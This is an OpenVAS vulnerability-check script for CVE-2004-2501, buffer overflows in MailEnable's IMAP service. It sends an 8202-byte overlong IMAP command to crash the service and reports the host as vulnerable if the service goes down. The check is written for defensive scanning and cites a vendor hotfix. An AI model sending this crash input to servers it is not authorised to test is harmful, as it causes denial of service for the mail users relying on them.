# OpenVAS Vulnerability Test
# $Id: mailenable_imap_overflows.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: MailEnable IMAP Service Remote Buffer Overflows
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The target is running at least one instance of MailEnable's IMAP
service.  Two flaws exist in MailEnable Professional Edition 1.52 and
earlier as well as MailEnable Enterprise Edition 1.01 and earlier - a
stack-based buffer overflow and an object pointer overwrite.  A remote
attacker can use either vulnerability to execute arbitrary code on the
target.  More information is available at :

  http://www.hat-squad.com/en/000102.html";

tag_solution = "Apply the IMAP hotfix dated 25 November 2004 and found at :

  http://www.mailenable.com/hotfix/default.asp";


if (description) {
  script_oid("1.3.6.1.4.1.25623.1.0.15852");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2004-2501");
  script_bugtraq_id(11755);
  script_xref(name:"OSVDB", value:"12135");
  script_xref(name:"OSVDB", value:"12136");

  name = "MailEnable IMAP Service Remote Buffer Overflows";
  script_name(name);
 
 
  summary = "Checks for Remote Buffer Overflows in MailEnable's IMAP Service";
 
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Denial of Service";
  script_family(family);

  script_dependencies("find_service.nasl", "global_settings.nasl");
  script_require_ports("Services/imap", 143);

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("global_settings.inc");

# NB: MailEnable doesn't truly identify itself in the banner so we just
#     connect and send a long command to try to bring down the service 
#     if it looks like it's MailEnable.
port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);
banner = get_kb_item("imap/banner/" + port);
if ("IMAP4rev1 server ready at" >!< banner) exit(0);

# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);

# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
s = chomp(s);

# Send a long command and see if the service crashes.
#
# nb: this tests only for the stack-based buffer overflow; the object
#     pointer overwrite vulnerability reportedly occurs in the same
#     versions so we just assume it's present if the former is.
c = string("a1 ", crap(8202));
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:"^a1 (OK|BAD|NO)", string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp='';
}
# If we don't get a response, make sure the service is truly down.
if (!resp) {
  close(soc);
  soc = open_sock_tcp(port);
  if (!soc) {
    security_message(port);
    exit(0);
  }
}

# Logout.
c = string("a2", " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:"^a2 (OK|BAD|NO)", string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
